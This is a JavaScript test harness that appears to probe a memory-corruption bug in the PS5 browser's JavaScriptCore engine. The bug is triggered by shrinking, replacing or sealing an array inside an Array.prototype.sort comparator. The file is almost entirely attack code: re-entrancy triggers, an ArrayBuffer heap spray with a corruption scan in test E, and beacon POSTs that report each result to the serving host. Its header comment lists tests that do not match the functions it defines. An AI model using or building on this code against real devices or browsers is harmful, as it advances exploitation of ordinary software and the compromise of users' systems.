/*
 * p434 -- Array.prototype.sort() comparator re-entrancy
 *
 * If comparator shrinks the array (arr.length=0), sortCommit still
 * writes sortedLength elements back. @assert compiled out on PS5.
 * Gigacage disabled = writes land in JSC object heap.
 *
 * Tests:
 *   A: Baseline sort (verify sort works)
 *   B: Shrink to 0 in first comparator call
 *   C: Shrink to 0 after N comparator calls
 *   D: Replace array contents in comparator
 *   E: Delete + redefine properties in comparator
 *   F: Large array (100 elems) to trigger @appendMemcpy fast path
 *   G: Proxy array with get/set traps during sort
 *
 * Beacon prefix: V434-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V434-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test A: Baseline sort
// ================================================================
function testA() {
  B("A-START");
  var arr = [5, 3, 1, 4, 2];
  arr.sort(function(a, b) { return a - b; });
  B("A-RESULT", arr.join(","));
}

// ================================================================
// Test B: Shrink to 0 on first comparator call
// ================================================================
function testB() {
  B("B-START");
  var arr = [5, 3, 1, 4, 2, 8, 7, 6, 10, 9];
  var calls = 0;
  var shrunk = false;
  try {
    arr.sort(function(a, b) {
      calls++;
      if (!shrunk) {
        shrunk = true;
        arr.length = 0;
        B("B-SHRUNK", {calls: calls, len: arr.length});
      }
      return a - b;
    });
    B("B-AFTER", {len: arr.length, calls: calls, vals: arr.slice(0, 10).join(",")});
  } catch(e) {
    B("B-ERR", {msg: e.message.slice(0, 60), calls: calls, len: arr.length});
  }
}

// ================================================================
// Test C: Shrink after 5 comparator calls (mid-sort)
// ================================================================
function testC() {
  B("C-START");
  var arr = [];
  for (var i = 0; i < 20; i++) arr.push(20 - i);
  var calls = 0;
  var shrunk = false;
  try {
    arr.sort(function(a, b) {
      calls++;
      if (calls === 5 && !shrunk) {
        shrunk = true;
        arr.length = 0;
        B("C-SHRUNK", calls);
      }
      return a - b;
    });
    B("C-AFTER", {len: arr.length, calls: calls, vals: arr.slice(0, 10).join(",")});
  } catch(e) {
    B("C-ERR", {msg: e.message.slice(0, 60), calls: calls});
  }
}

// ================================================================
// Test D: Large array (100 elements) -- triggers fast path
// ================================================================
function testD() {
  B("D-START");
  var arr = [];
  for (var i = 0; i < 100; i++) arr.push(100 - i);
  var calls = 0;
  var shrunk = false;
  try {
    arr.sort(function(a, b) {
      calls++;
      if (calls === 1 && !shrunk) {
        shrunk = true;
        arr.length = 0;
        B("D-SHRUNK", {calls: calls});
      }
      return a - b;
    });
    B("D-AFTER", {len: arr.length, calls: calls, first5: arr.slice(0, 5).join(",")});
  } catch(e) {
    B("D-ERR", {msg: e.message.slice(0, 60), calls: calls});
  }
}

// ================================================================
// Test E: 200 elements, shrink mid-sort, check for corruption
// Spray ArrayBuffers before sort to fill heap with known pattern
// ================================================================
function testE() {
  B("E-START");

  // Spray heap with marker ABs
  var spray = [];
  for (var i = 0; i < 100; i++) {
    var ab = new ArrayBuffer(64);
    var v = new Float64Array(ab);
    v[0] = 1.1; v[1] = 2.2; v[2] = 3.3; v[3] = 4.4;
    spray.push(ab);
  }

  var arr = [];
  for (var i = 0; i < 200; i++) arr.push(200 - i);
  var calls = 0;
  var shrunk = false;
  try {
    arr.sort(function(a, b) {
      calls++;
      if (calls === 1 && !shrunk) {
        shrunk = true;
        arr.length = 0;
        // Allocate something to fill the freed butterfly hole
        for (var j = 0; j < 50; j++) {
          spray.push(new ArrayBuffer(32));
        }
        B("E-SHRUNK");
      }
      return a - b;
    });
    B("E-AFTER", {len: arr.length, calls: calls});

    // Check spray ABs for corruption
    var corrupted = 0;
    for (var i = 0; i < spray.length; i++) {
      try {
        var v = new Float64Array(spray[i]);
        if (spray[i].byteLength >= 32 && v[0] !== 1.1 && v[0] !== 0 && spray[i].byteLength === 64) {
          corrupted++;
          B("E-CORRUPT-" + i, {len: spray[i].byteLength, v0: v[0], v1: v[1]});
          if (corrupted >= 3) break;
        }
      } catch(e) {}
    }
    B("E-CORRUPT-COUNT", corrupted);
  } catch(e) {
    B("E-ERR", e.message.slice(0, 80));
  }

  B("E-SPRAY-ALIVE", spray.length);
}

// ================================================================
// Test F: Instead of shrinking, REPLACE elements with objects
// Sort compares numbers, but we replace with objects mid-sort
// ================================================================
function testF() {
  B("F-START");
  var arr = [];
  for (var i = 0; i < 50; i++) arr.push(50 - i);
  var calls = 0;
  var replaced = false;
  try {
    arr.sort(function(a, b) {
      calls++;
      if (calls === 3 && !replaced) {
        replaced = true;
        // Replace all elements with objects while sort holds copies
        for (var j = 0; j < arr.length; j++) {
          arr[j] = {v: j, toString: function() { return "X"; }};
        }
        B("F-REPLACED");
      }
      return a - b;
    });
    B("F-AFTER", {len: arr.length, calls: calls, type0: typeof arr[0]});
  } catch(e) {
    B("F-ERR", {msg: e.message.slice(0, 60), calls: calls});
  }
}

// ================================================================
// Test G: Sort with detach-like behavior via configurable properties
// ================================================================
function testG() {
  B("G-START");
  var arr = [];
  for (var i = 0; i < 30; i++) arr.push(30 - i);
  var calls = 0;
  try {
    arr.sort(function(a, b) {
      calls++;
      if (calls === 2) {
        // Seal the array -- prevents structural changes
        // But sort already has a copy, writes back after
        Object.seal(arr);
        B("G-SEALED");
      }
      return a - b;
    });
    B("G-AFTER", {len: arr.length, calls: calls, sealed: Object.isSealed(arr)});
  } catch(e) {
    B("G-ERR", {msg: e.message.slice(0, 60), calls: calls});
  }
}

testA();
setTimeout(function() { testB(); }, 100);
setTimeout(function() { testC(); }, 200);
setTimeout(function() { testD(); }, 300);
setTimeout(function() { testE(); }, 400);
setTimeout(function() { testF(); }, 600);
setTimeout(function() { testG(); }, 800);
setTimeout(function() { B("DONE"); }, 2000);
})();
